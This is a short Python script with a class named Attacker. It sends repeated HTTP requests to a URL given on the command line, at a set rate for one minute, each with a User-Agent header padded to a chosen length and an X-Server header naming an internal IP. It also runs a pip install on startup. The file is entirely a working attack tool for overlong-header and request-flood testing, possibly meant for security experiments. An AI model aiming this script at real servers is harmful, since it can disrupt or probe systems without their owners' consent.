import os
import sys
import time

os.system('python -m pip install requests')
import requests

class Attacker:
    def __init__(self):
        self.count = 0

    def request_http(self, url, length):
        self.count += 1

        try:
            r = requests.get(url, headers = {'user-agent': 'A' * length + '123', 'X-Server': '172.31.10.25'}, timeout=0.1)
            print ("attack, reply %d, %d" % (r.status_code, self.count))
        except:
            print ("attack, no reply, %d" % self.count)

def main():
    url = sys.argv[1].strip()
    frequency = int(sys.argv[2]) # number of attacks per minute
    length = int(sys.argv[3])
    interval = 60.0 / frequency
    time.sleep(1.0)

    attacker = Attacker()
    start_time = time.time()
    while time.time() - start_time < 60:
        send_time = time.time()
        attacker.request_http(url, length)
        elapsed = time.time() - send_time
        if elapsed < interval:
            time.sleep(interval - elapsed)

if __name__ == "__main__":
    print ('==========Start %f==========' % time.time())
    main()
    print ('==========End %f==========' % time.time())
